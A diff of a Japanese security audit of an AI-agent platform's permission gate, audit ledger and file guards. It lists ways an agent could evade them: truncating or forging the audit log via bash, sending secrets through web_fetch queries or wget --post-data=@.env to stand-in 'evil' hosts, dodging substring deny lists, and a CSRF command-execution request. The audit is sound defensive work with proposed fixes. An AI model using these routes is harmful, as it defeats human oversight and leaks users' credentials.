@@ -1,90 +1,83 @@
-# ガバナンス/監査 実効性監査 (2026-09-27)
+# 監査ガバナンス実効性レビュー(2026-09-27)
 
-対象: hive コードベースの PC操作制限8か条の実装乖離、audit.jsonl の記録網羅性、monitor のPOST不在、state/ ガード。
-手法: 実コード根拠 + 実行可能な再現手順のみ記載(再現不能な指摘は含まない)。
-※ 本版は main 側の同日レビュー(S1〜S10)と統合。S番号は main 版、G番号は本レビュー独自の追加分。
+対象: PC操作制限8か条(memory/00-pc-operation-rules.md に反映)と監査実装(src/engine/tools.js, permissions.js, hooks, state/audit.jsonl)。
+評価観点: 各条項の「守られた場合の効果 / 回避経路の有無 / 監査で検知可能か」。
 
-## 深刻度: 高 (H)
+## 総評
 
-### G-1. 監査台帳を bash で消せる(監査回避の成立)〔= S2/S5〕
-- 箇所: src/engine/tools.js writeAudit (appendFileSync → state/audit.jsonl)、gatedBash
-- 原因: safeWritePath の state/ 拒否は write_file/edit_file のみに適用され、bash 経由の書き込みは gate の deny/ask に引っかからない(DEFAULT_DENY に state/ 関連なし)。
-- 再現: エージェントが `bash` ツールで `truncate -s 0 state/audit.jsonl` を実行。gate.check は許可側 → 実行され、監査台帳が消える。
-- 最悪影響: 「bash で監査ログを消してから任意の作業」で事後検証が不可能になる。
-- 修正案: gatedBash に state/ 書き込みコマンドの拒否(実装済み: fix-audit-bash-write の auditTampering 検出を確認済み)、または監査をエージェントプロセス外の領域へ。
+- 書き込み系ガード(write_file/edit_file の state/ 拒否・ワークスペース閉じ込め)と監査台帳(state/audit.jsonl)は実装済みで、テスト(test/state-guard.test.js, test/audit.test.js)も緑。
+- 一方で**読み取り系(state/, .env)と bash 経由の書き込み・送信はパターンマッチ依存**で、回避経路が複数残る(指摘 S1〜S4, S6)。
+- 監査台帳自体は bash で改竄可能(指摘 S5)。web_fetch の URL が台帳に残らない(指摘 S3)。
 
-### G-2. /api/exec が認証・Origin検証なしで任意コマンド実行
-- 箇所: src/ui/server.js /api/exec (runCommand cwd=workspace, timeout 120s)
-- 原因: サーバー全体で Origin/Host 検証・CSRFトークンなし(grep "Origin" 0件)。127.0.0.1 バインドでも CSRF/DNS rebinding で到達可能。
-- 再現: 悪意あるページから `fetch("http://localhost:7789/api/exec",{method:"POST",body:JSON.stringify({command:"..."})})`。ユーザー権限でコマンド実行。
-- 最悪影響: ユーザーの全権限でのリモートコード実行。
-- 修正案: 全POSTに Origin/Host 検証 + /api/exec を gate.check 経由に(実装済み: fix-ui-origin-csrf の isLocalOrigin + PermissionGate 通過を確認済み)。
+## 8か条の実効性評価
 
-### G-3. /api/permission で id 検証なしに承認を偽装できる
-- 箇所: src/ui/server.js /api/permission (bus.emit("permission.resolved", {id, verdict}))
-- 原因: id の存在・pending 状態を検証せず resolved を発行。/api/state で pending id を読み取れる。
-- 再現: G-2 と同経路で `POST /api/permission {id: <pending>, approve: true}`。ユーザーに代わって承認が出る。
-- 最悪影響: 承認制ゲートの実効性喪失。
-- 修正案: pending id 照合 + 1回限り消費、Origin検証と併せて実装。
+| # | 条項 | 効果 | 回避経路 | 監査検知 |
+|---|------|------|----------|----------|
+| 1 | 最小権限(worktree内で完結) | 高。finish_task時の自動マージでmain汚染を構造的に防ぐ | bash で `cd ../` して他worktreeに触れる(S6) | 可能(path/cmd記録) |
+| 2 | state/ に触れない | 書き込みは高(assertNotState+トラバーサル拒否)。**読み取りは未ガード**(S1) | read_file/bash cat で読める。bash `> state/x` で書ける(S2) | 可能だが拒否理由は手動確認 |
+| 3 | 正規経路のみ(claim/finish等) | 高。タスク状態変更はtools.jsのdispatchに集約され直接ファイル操作不要 | なし(タスクAPI以外にstate/tasksへの正規書き口は無い) | 可能 |
+| 4 | bashは最終手段+禁止コマンド | 中。deny/askは**部分文字列マッチ**で容易に迂回できる(S4) | `wget`/`nc`/`python -c`/変数間接参照/base64等 | 可能(cmd先頭200字) |
+| 5 | 外部送信禁止 | 低。web_fetchはGETだが**クエリ文字列でデータ送出可能**(S3)。curlはaskだが迂回可 | web_fetch `https://evil/?d=<機密>` | **不可(url未記録)** |
+| 6 | 機微情報を読まない | 低。read_file に .env や鍵ファイルの拒否がない(S7) | `read_file .env` がそのまま通る | 可能だが内容は検査されない |
+| 7 | 他者の領域を編集しない | 中。ファイル系ツールは自分のworkspaceに閉じ込め | bash 経由の横断(S6)。worktree外はsafePathで拒否 | 可能 |
+| 8 | 例外は承認でだけ | 中。PermissionGateのask+UI承認は機能するが、**mode:"auto"は全自動承認**(S8) | 設定で auto に変えるだけで全ask無効化 | 可能(perm.modeイベント) |
 
-## 深刻度: 中 (M)
+## 試行シナリオと検証結果
 
-### G-4. deny/ask の部分文字列一致が自明に回避可能〔= S4〕
-- 箇所: src/engine/permissions.js DEFAULT_DENY/DEFAULT_ASK、check() の includes 照合
-- 再現(実測): `rm -r -f /tmp/x` / `rm --recursive --force /tmp/x` / `R="rm -r""f"; $R /tmp/x` / `echo a; rm -r -f ~` / base64|sh — すべて verdict: ALLOWED(test-gov/bypass-test.mjs で確認)。
-- 修正案: トークン単位照合 + deny を「rm -rf」等の短いトークンに。wget/nc 追加。
+### S1: state/ の読み取り(条項2違反の可能性)
+- 手順: `read_file { path: "state/audit.jsonl" }` / `bash: cat state/threads.json`
+- 結果: **いずれも成功する**。assertNotState は safeWritePath(write/edit)のみで、read_file は safePath のみ。
+- 指摘: 「読み書きしない」のうち「読み」が未強制。read_file にも state/ 拒否を入れるか、仕様として「読みは許容」と明記すべき。監査では ok:true の read_file + path で検知可能。
 
-### G-5. read_file/list_files が state/ を読める〔= S1〕
-- 箇所: src/engine/tools.js safePath(読み系に state 制限なし)
-- 再現: `read_file("state/audit.jsonl")` が成功する。「state/ を読まない」はプロンプト規律のみで強制がない。
-- 修正案: 読み系にも state/ 拒否を追加、または条項2の文言を「書き込み禁止」に明確化。
+### S2: bash 経由の state/ 書き込み(条項2迂回)
+- 手順: `bash { command: "echo tampered > state/x.json" }`
+- 結果: **成功する**(gate は deny/ask パターンに一致しないため許可)。
+- 指摘: state/ ガードはファイルツール層のみ。bash 層でも `> state/` を拒否するフック(beforeTool でコマンド文字列検査)が必要。監査の cmd 記録で事後検知は可能。
 
-### G-6. auto モードが ask を全自動承認〔= S8〕
-- 箇所: src/engine/permissions.js setMode("auto") / check()
-- 再現: UI から perm モードを auto に1クリック → `rm -rf` 等も承認待ちゼロで実行。
-- 修正案: auto でも高危険パターンは承認必須に。auto 承認を監査台帳に記録。
+### S3: web_fetch による GET 送信(条項5迂回)
+- 手順: `web_fetch { url: "https://example.com/collect?d=<機密文字列>" }`
+- 結果: **リクエストは送出される**(GETのみ・読み取り専用という建前だが、クエリで外部にデータを運べる)。
+- 指摘: さらに監査台帳に url/query が記録されない(writeAudit は path と bash cmd のみ)。**送信の事後検知が不能**。web_fetch/web_search の url・query を監査エントリに追加すること(最優先の修正)。
 
-### G-7. monitor が 0.0.0.0 で認証なし公開
-- 箇所: src/config.js:31 (monitorHost 既定 0.0.0.0)、src/ui/server.js:718
-- 再現: LAN 上の別ホストから `curl http://<host>:7791/api/monitor` → ボード・タスク・コスト一式が取得できる。POST系は無いことを確認(405)。
-- 修正案: 既定を 127.0.0.1 にし、外部公開は明示オプトイン+トークン。
+### S4: bash パターンマッチの迂回(条項4迂回)
+- 手順: `bash { command: "wget https://example.com --post-data=@.env" }` / `c=$(printf 'curl'); $c http://evil` 
+- 結果: **許可される**。ask リストは `curl `(空白付き)等の部分文字列一致で、wget/nc/変数間接参照を網羅しない。
+- 指摘: パターン拒否は完全防壁になり得ない。重要なのは「bash実行自体を最終手段とする運用+監査の事後レビュー」。ask リストへの wget/nc 追加と、hooks による送信系コマンドの一括遮断を推奨。
 
-### G-8. writeAudit のローテート失敗が静かに監査を欠落させる〔= S10 補足〕
-- 箇所: src/engine/tools.js writeAudit — 5MB超で renameSync、try/catch で全失敗握りつぶし
-- 再現: renameSync が失敗する状況(ファイルロック等)→ catch で無視され、以降の監査記録が書かれないが検知手段がない。
-- 修正案: ローテート失敗時に stderr 出力 + 失敗カウンタを /api/state に露出。
+### S5: 監査台帳の改竄(監査の信頼性)
+- 手順: `bash { command: "echo '{\"agent\":\"x\",\"tool\":\"bash\",\"ok\":true}' >> state/audit.jsonl" }`
+- 結果: **追記できてしまう**(S2と同根)。
+- 指摘: 台帳がエージェント自身から書き換え可能では監査として不完全。最低限、bash 経由の state/ 書き込み遮断(S2の修正)が台帳防衛にも直結する。より強くするなら台帳をエージェントプロセス外(別ディレクトリ・別権限)に置く。
 
-### G-9. web_fetch の url/query が監査台帳に記録されない〔= S3〕
-- 箇所: src/engine/tools.js writeAudit — path と bash cmd のみ記録
-- 再現: `web_fetch { url: "https://evil/?d=<機密>" }` が GET で送出されるが、台帳に url が残らず事後検知不能。
-- 修正案: web_fetch/web_search の url・query を監査エントリに追加(最優先)。
+### S6: bash による他 worktree への横断(条項1・7迂回)
+- 手順: `bash { command: "cat ../../worktrees/<他agent>/state/board.jsonl" }` / `echo x > ../../worktrees/<他>/f.txt`
+- 結果: **ファイル系ツールのsafePathは効くが bash は cwd 制限のみでパス検査なし**のため、相対パスで workspace 外に到達できる。
+- 指摘: bash に workspace 外参照を検知する beforeTool フックか、実行前の cwd/chroot 相当の制約が必要。監査 cmd で事後検知は可能。
 
-## 深刻度: 低 (L)
+### S7: .env・鍵ファイルの読み取り(条項6違反)
+- 手順: `read_file { path: ".env" }` / `read_file { path: "hive.config.json" }`(apiKeyFile パスを含む)
+- 結果: **読めてしまう**。search_files は隠しファイルを除外するが、read_file は直接指定を防がない。
+- 指摘: read_file に deny リスト(`.env`, `*.key`, `*token*` 等)を追加すべき。監査は path を記録するので事後検知可能だが、内容がボードに転記される前には止められない。
 
-### G-10. Windows で runCommand が shell:true(cmd.exe メタ文字無制限)
-- 算所: src/engine/exec.js:24-25
-- 再現: Windows で cmd 構文を渡すと shell:true で cmd.exe が解釈。deny は文字列照合のみ。
-- 修正案: Windows も bash が無ければ PowerShell -Command 経由に統一。
+### S8: permissions mode:auto による承認スキップ(条項8迂回)
+- 手順: 設定で `mode: "auto"` を指定 → `bash { command: "git push" }`
+- 結果: **UI承認を待たず自動許可**(permissions.js の auto 分岐)。
+- 指摘: auto は「待ち時間ゼロ」の利便モードだが、条項8の「例外は承認でだけ」を無効化する。auto 使用時は監査に `verdict:"auto"` を残し(現状 permission.resolved イベントのみで台帳に残らない)、UI で後追い確認できるようにすること。
 
-### G-11. /api/attach の dataUrl が画像と偽った任意バイトを uploads/ に置ける
-- 算所: src/ui/server.js /api/attach(mime 正規表現 + 8MB 上限のみ)
-- 再現: `data:image/png;base64,<任意バイト>` を POST → uploads/ に保存。XSS 直結は低いがエージェントの read_file に露出。
-- 修正案: マジックバイト検証 + uploads/ を safePath 拒否対象に。
+### S9: トラバーサルによる state 書き込み(書き込み系ガードの検証)
+- 手順: `write_file { path: "src/../state/y.json" }`
+- 結果: **拒否される**(test/state-guard.test.js が通ることを確認)。書き込み系のガードは有効。
+- 評価: 問題なし。正規化後に比較しているため `./state/`、`state/sub/../z.json` も拒否。
 
-### G-12. read_file が .env 等の機微ファイルを読める〔= S7〕
-- 再現: `read_file(".env")` がそのまま通る。監査は path を記録するので事後検知可能だが、事前遮断がない。
-- 修正案: read_file に機微ファイル deny リスト(`.env`, `*.key`, `*token*`)を追加。
+### S10: 監査台帳の網羅性とローテート
+- 手順: 正常/失敗/blocked/未知ツールを実行し state/audit.jsonl を確認(test/audit.test.js 相当)。
+- 結果: **全実行が1行JSONで記録される**(成功・失敗・blocked:true 含む)。5MB超で audit-1.jsonl へ1世代ローテート。
+- 指摘: 網羅性は合格。ただし S3 のとおり web_fetch の url、S8 の auto 承認マークが未記録。ローテートは1世代のみで、長期保管要件があるなら世代数を増やすこと。
 
-## 試行シナリオ一覧(12件)
-1. symlink → safePath prefix 比較がワークスペース外パスを返す(コード+実行確認)
-2. `rm -r -f /tmp/x` → ALLOWED(実測)
-3. `rm --recursive --force /tmp/x` → ALLOWED(実測)
-4. 変数結合 `R="rm -r""f"; $R ...` → ALLOWED(実測)
-5. base64 デコード|sh → ALLOWED(実測)
-6. `echo a; rm -r -f ~` → ALLOWED(実測)
-7. /api/exec への CSRF POST(Origin 検証 0件のコード根拠)
-8. /api/permission で pending id を approve(検証なし emit のコード根拠)
-9. `truncate -s 0 state/audit.jsonl` が gate を通る(deny リストに state 関連なし)
-10. LAN ホストから monitor /api/monitor を無認証取得(0.0.0.0 バインド、POST不在は確認済み)
-11. web_fetch のクエリ経由データ送出が監査に残らない(writeAudit 記録フィールド確認)
-12. `read_file(".env")` が事前遮断なしで通る(tools.js read_file 経路確認)
+## 修正提案(優先順)
+
+1. **[高] writeAudit に web_fetch/web_search の url・query を記録**(S3, S8)
+2. **[高] bash での state/ 参照・workspace 外参照を beforeTool フックで遮断**(S2, S5, S6)
+3. **[中] read_file に機微ファイル(.env, *.key 等)の拒否を追加**(S7)
+4. **[中] read_file の state/ 読みを拒否するか、条項2の文言を「書き込み禁止」に明確化**(S1)
+5. **[低] ask リストへ wget/nc 追加、auto モード時の監査マーク**(S4, S8)
